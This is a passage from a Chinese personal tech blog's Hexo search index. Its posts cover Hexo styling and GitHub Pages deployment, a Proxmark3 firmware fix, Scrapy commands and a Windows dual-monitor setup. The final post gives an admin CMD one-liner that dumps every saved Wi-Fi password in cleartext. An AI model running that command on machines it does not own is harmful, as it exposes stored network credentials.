修改注释的样式"></a>0x16 修改注释的样式</h3><p><code>next\source\css\_custom\custom.styl</code>文件添加</p><pre><code>blockquote {    margin: 10px 0 0 0;    padding: 0 15px;    color: #777;    border-left: 4px solid #42b983;    border-radius: 5px;     background-color: rgba(66, 185, 131, .1);}</code></pre><h3 id="0x17-页面宽度"><a href="#0x17-页面宽度" class="headerlink" title="0x17 页面宽度"></a>0x17 页面宽度</h3><p>修改<code>next\source\css\_variables\custom.styl</code></p><pre><code>// 修改成你期望的宽度$content-desktop = 900px// 当视窗超过 1600px 后的宽度$content-desktop-large = 1100px// 窗口最大化的宽度$content-desktop-largest        = 1100px</code></pre>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo + Github + 域名 搭建个人博客(不免费搭建)</title>
    <link href="/2019/08/18/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/08/18/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-准备"><a href="#0x00-准备" class="headerlink" title="0x00 准备"></a>0x00 准备</h3><p>Git: <code>https://git-scm.com/</code> #需要配置相应的环境变量<br>Node: <code>https://nodejs.org/zh-cn/</code>  #需要配置相应的环境变量<br>Github账号: <code>https://github.com/</code><br>域名:我这里准备的是阿里云的(.top/.net/.cc/.site/.club/.fun/.biz/.red 等等之类 都很便宜的)</p><a id="more"></a><h3 id="0x01-安装Hexo"><a href="#0x01-安装Hexo" class="headerlink" title="0x01 安装Hexo"></a>0x01 安装Hexo</h3><p>首先在本地磁盘中建立一个文件夹(名字随意),用于本地保存和测试</p><p>在你创建的文件夹中 右键 Git bash Here<br>Git bash Here(git命令行模式)安装Hexo<br>命令行中输入<code>npm install hexo -g</code><br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/2.png" srcset="/img/loading.gif" alt=""></p><p>输入<code>hexo -v</code>,检查hexo是否安装成功<br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/11.png" srcset="/img/loading.gif" alt=""></p><p>安装好之后,对hexo进行初始胡:<code>hexo init</code><br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/3.png" srcset="/img/loading.gif" alt=""></p><p>然后输入<code>npm install</code></p><p>生成静态页面<code>hexo g</code>(hexo generate的简写)<br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/4.png" srcset="/img/loading.gif" alt=""></p><p>本地启动<code>hexo s</code><br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/5.png" srcset="/img/loading.gif" alt=""></p><p>访问<code>127.0.0.1:4000</code>就可以看到你的个人博客初步建成了<br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/6.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-上传-Github"><a href="#0x02-上传-Github" class="headerlink" title="0x02 上传 Github"></a>0x02 上传 Github</h3><h4 id="在github创建项目"><a href="#在github创建项目" class="headerlink" title="在github创建项目"></a>在github创建项目</h4><p>登录注册之后的github账号<br>在github上面创建项目<br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/7.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/8.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/9.png" srcset="/img/loading.gif" alt=""></p><p>注意:这里的名字必须和前面的名字相同,后缀一定是.github.io</p><h4 id="添加ssh-key-到github中"><a href="#添加ssh-key-到github中" class="headerlink" title="添加ssh key 到github中"></a>添加ssh key 到github中</h4><p>生成SSH  keys</p><blockquote><p>ssh-keygen -t rsa -C “Github的注册邮箱地址”<br>一路回车即可,待秘钥生成完毕，会得到两个文件id_rsa和id_rsa.pub</p></blockquote><p>通过<code>cd ~/.ssh/</code>达到ssh保存的位置<br>查看id_rsa.pub文件中的ssh key，并复制到github中</p><blockquote><p>cat id_rsa.pub</p></blockquote><p><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/12.png" srcset="/img/loading.gif" alt=""></p><p>进入自己刚注册的Github<br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/13.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/14.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/15.png" srcset="/img/loading.gif" alt=""></p><p>接下来测试SSH是否配好,输入下面的指令,会提示你输入yes/no你输入yes就行，这样ssh就配好</p><blockquote><p>ssh -T <a href="mailto:git@github.com">git@github.com</a><br>第一次 可能会让你输入用户和密码 就是你注册github的用户和密码</p></blockquote><p>此时你还需配置</p><blockquote><p>git config –global user.name “liuxianan” // 你的github用户名，非昵称<br>git config –global user.email  “<a href="mailto:xxx@qq.com">xxx@qq.com</a>“ //填写你的github注册邮箱</p></blockquote><p>问题：假如ssh-key配置失败，那么只要以下步骤就能完全解决</p><blockquote><p>首先，清除所有的key-pair<br>ssh-add -D<br>rm -r ~/.ssh<br>删除你在github中的public-key<br>然后重复一次 “添加ssh key 到github中的” 操作</p></blockquote><h4 id="上传至github项目中"><a href="#上传至github项目中" class="headerlink" title="上传至github项目中"></a>上传至github项目中</h4><p>修改博客根目录下的 _config.yml,修改 Deployment 部分</p><pre><code># Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:  type: git  #repository: 此处为你的github链接,不懂请看下图  repository: https://github.com/Root-warning/Root-warning.github.io.git  branch: master</code></pre><p><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/10.png" srcset="/img/loading.gif" alt=""></p><p>弄好之后就可以开始部署(上传至github了)<code>hexo d</code></p><p>输入hexo d可能会报ERROR Deployer not fount： git错误<br>这是因为没有安装hexo-deployer-git这个模块，导致Git不能识别该命令，输入下面指令安装该模块即可。</p><blockquote><p>npm install hexo-deployer-git –save</p></blockquote><p>等模块安装完再次执行<code>hexo d</code><br>会有弹出框，输入自己之前注册的github账号进行登录即可</p><p>稍等一会,成功之后，在浏览器中输入 你的github用户名.github.io<br>这样就可以访问你的博客了</p><p>附录:<br>常用指令:</p><pre><code>hexo g  #完整命令为hexo generate,用于生成静态文件hexo s  #完整命令为hexo server,用于启动服务器，主要用来本地预览hexo d  #完整命令为hexo deploy,用于将本地文件发布到github上hexo h  #完整命令为hexo new,用于新建一篇文章</code></pre><h3 id="0x03-绑定域名"><a href="#0x03-绑定域名" class="headerlink" title="0x03 绑定域名"></a>0x03 绑定域名</h3><p>在这里我就不写怎么购买域名了，个人感觉很简单</p><p>在博客目录下的<code>source</code>目录新建<code>CNAME</code>文件</p><blockquote><p><a href="http://www.sariel.top" target="_blank" rel="noopener">www.sariel.top</a></p></blockquote><p>上面的是我的域名<br><code>CNAME</code>文件内就是,你所购买的域名,不需要任何的<code>http://</code><br>注意<code>CNAME</code>文件名一定要大写</p><p>上传<code>hexo d</code></p><p>接下来就是解析了,最新的规定 <code>你购买的域名一定要实名认证否则是解析不了</code><br><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/16.png" srcset="/img/loading.gif" alt=""></p><p><img src="/images/Hexo/hexo+github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/17.png" srcset="/img/loading.gif" alt=""></p><p>添加这两条就够了,记录值就是 你github上创建的项目 github用户名.github.io 这样格式的访问地址</p><p>这样之后，稍等几分钟，主要看各地运行商刷新 DNS的时间吧</p><p>输入你的 域名就可访问了</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PM3刷固件出问题</title>
    <link href="/2018/10/11/%E7%A1%AC%E4%BB%B6/PM3%20%E5%88%B7%E5%9B%BA%E4%BB%B6%E9%97%AE%E9%A2%98/"/>
    <url>/2018/10/11/%E7%A1%AC%E4%BB%B6/PM3%20%E5%88%B7%E5%9B%BA%E4%BB%B6%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>之前刷固件出了点问题，插在电脑上不识别<br>解决方法：按住按钮重新拔插，然后再刷，刷完了断电，再松开按钮！</p>]]></content>
    
    
    <categories>
      
      <category>硬件相关</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PM3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识scrapy框架</title>
    <link href="/2018/06/21/Python/scrapy/%E5%88%9D%E8%AF%86scrapy/"/>
    <url>/2018/06/21/Python/scrapy/%E5%88%9D%E8%AF%86scrapy/</url>
    
    <content type="html"><![CDATA[<h2 id="认识scrapy"><a href="#认识scrapy" class="headerlink" title="认识scrapy"></a>认识scrapy</h2><p>Scrapy是为了爬取网址数据，提取结构性数据而编写的应用框架</p><h2 id="了解-scrapy-文件"><a href="#了解-scrapy-文件" class="headerlink" title="了解 scrapy 文件"></a>了解 scrapy 文件</h2><p><code>__init__</code>初始化文件，主要写的是一份项目的初始化信息<br><code>items.py</code>数据容器文件，主要用来定义我们要获取的数据<br><code>pipelines.py</code> 管道文件，主要用来对items里面定义的数据进一步的加工与处理<br><code>settings.py</code> 设置文件，主要为爬虫项目的一些设置信息<br><code>spiders</code>文件夹放置的是爬虫项目中的爬虫部分相关的文件<br>spiders文件夹下<code>__init__</code>初始化文件，主要对spiders进行初始化</p><a id="more"></a><h2 id="创建爬虫项目"><a href="#创建爬虫项目" class="headerlink" title="创建爬虫项目"></a>创建爬虫项目</h2><p>在<code>cmd</code>中，选择创建爬虫的目录</p><pre><code>scrapy startproject 项目名</code></pre><p>创建成功后，可以进入爬虫所在目录</p><h2 id="常用工具命令"><a href="#常用工具命令" class="headerlink" title="常用工具命令"></a>常用工具命令</h2><p>全局命令<br>项目命令</p><blockquote><p>bench命令比较特殊，虽在Available commands中展现，但仍归为项目命令</p></blockquote><h3 id="全局命令"><a href="#全局命令" class="headerlink" title="全局命令"></a>全局命令</h3><pre><code># fetch主要用来显示爬虫爬取的过程scrapy fetch http://www.baidu.com/scrapy fetch -h 获取帮助# runspider实现不依托scrapy的爬虫项目，直接运行一个爬虫文件scrpay runspider --loglevel=INFO 爬虫文件# settings查看scrapy对应的配置信息如果在项目目录使用setting命令，查看的对应项目的配置信息如果在项目外使用setting命令，查看的对scrapy默认配置信息scrapy settings --get BOT_NAME要想查看配置信息中的其他配置信息，我们只需要将上述命令中BOT_NAME位置换成要查询的配置信息项即可SPIDER_MODULES(爬虫模块相关)# shell可以启动Scrapy的交互终端(Scrapy shell)经常在开发以及调试的时候用到在不启动Scrapy爬虫的情况下，对网站响应进行调试，我们也可以写一些Python代码进行相应测试scrapy shell http://www.baidu.com --nolog爬虫完立即进入交互模式# startproject用于创建项目# version直接显示Scrapy的版本相关信息# view实现下载某个网页并用浏览器查看的功能scrapy view http://news.163.com</code></pre><h3 id="项目命令"><a href="#项目命令" class="headerlink" title="项目命令"></a>项目命令</h3><blockquote><p>项目命令一般只能在Scrapy爬虫项目文件夹中使用</p></blockquote><pre><code># bench可以测试本地硬件的性能会创建一个本地服务器并且会以最大的速度爬行，在此不进行内容的处理scrapy bench# check对爬虫进行合同检查scrapy check 爬虫名(无后缀)# crawl启动某个爬虫scrapy crwal 爬虫名# edit直接打开编辑器对爬虫文件进行编辑，在Windows中执行会出现问题# genspider创建爬虫文件，这是一种快速创建爬虫文件的方式基于现有的爬虫模板直接生产一个新的爬虫文件可以使用-l参数来查看当前可以使用的爬虫模板scrapy genspider -l使用任意一个模板来生成一个爬虫文件scrapy genspider -t 模板 新爬虫名 新爬虫爬取的域名-d    查看爬虫模板的内容scrapy genspider -d csvfeed# list列出当前可使用的爬虫文件scrapy list# parse获取指定的URL网址，并使用对应的爬虫文件进行处理和分析scrapy parse http://www.baidu.comparse有很多参数scrapy parse -h参数大致分为两类，普通参数(Options)和全局参数(Global Options)</code></pre><h3 id="parse命令对应的参数"><a href="#parse命令对应的参数" class="headerlink" title="parse命令对应的参数"></a>parse命令对应的参数</h3><table><thead><tr><th align="center">参数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">–spider=SPIDER</td><td align="center">强行指定某个爬虫文件spider进行处理</td></tr><tr><td align="center">-a NAME=VALUE</td><td align="center">设置spider的参数，可能会重复</td></tr><tr><td align="center">–pipelines</td><td align="center">通过pipelines来处理items</td></tr><tr><td align="center">–nolinks</td><td align="center">不展示提取的链接信息</td></tr><tr><td align="center">–noitems不展示得到的items</td><td align="center"></td></tr><tr><td align="center">–nocolour</td><td align="center">输出结果颜色不高亮</td></tr><tr><td align="center">–rules,-r</td><td align="center">使用CrawlSpider规则去处理回调函数</td></tr><tr><td align="center">–callback=CALLBACK,-c CALLBACK</td><td align="center">指定spider中用于处理返回的响应的回调函数</td></tr><tr><td align="center">–depth=DEPTH,-d DEPTH</td><td align="center">指定爬行深度，默认深度为1</td></tr><tr><td align="center">–verbose,-v</td><td align="center">显示每层的详细信息</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win10外接显示器实现双屏操作</title>
    <link href="/2018/03/16/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/"/>
    <url>/2018/03/16/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>今天看了大佬的学习环境,感觉和自己是天壤之别<br>无意中看到了,外接显示器连接一台笔记本实现了双屏<br>觉得很新鲜,也能提高不少学习效率</p><p>刚刚好,家里有一台 2010年买的三星显示器<br>虽然说有点老,将就用着吧</p><a id="more"></a><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>一台显示器<br>一个转接头(当然这个要是你电脑能直接插上就不用了)<br>一台装了win10的笔记本</p><p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/0.jpg" srcset="/img/loading.gif" alt=""><br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/1.jpg" srcset="/img/loading.gif" alt=""></p><p>插上电脑之后<br>实现分屏,<code>win+p</code><br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/4.png" srcset="/img/loading.gif" alt=""></p><p>修改外接显示器的分辨率<br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/3.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/2.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/5.png" srcset="/img/loading.gif" alt=""><br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/6.png" srcset="/img/loading.gif" alt=""></p><p>之后就可以了,鼠标一直往右移动,就可以到达外接显示器的桌面了</p><p>可以拖住窗口一直右移,即可</p><p>最后附上效果图<br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/win10%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/7.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CMD查看笔记本所有连接过的WIFI密码</title>
    <link href="/2018/03/01/%E9%9A%8F%E6%89%8B%E8%AE%B0/cmd%E4%B8%80%E9%94%AE%E6%9F%A5%E7%9C%8Bwifi%E5%AF%86%E7%A0%81/"/>
    <url>/2018/03/01/%E9%9A%8F%E6%89%8B%E8%AE%B0/cmd%E4%B8%80%E9%94%AE%E6%9F%A5%E7%9C%8Bwifi%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>笔记本以管理员权限运行<code>CMD</code><br>输入以下代码:</p><pre><code>for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</code></pre>]]></content>
    
    
    <categories>
      
      <category>随手记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
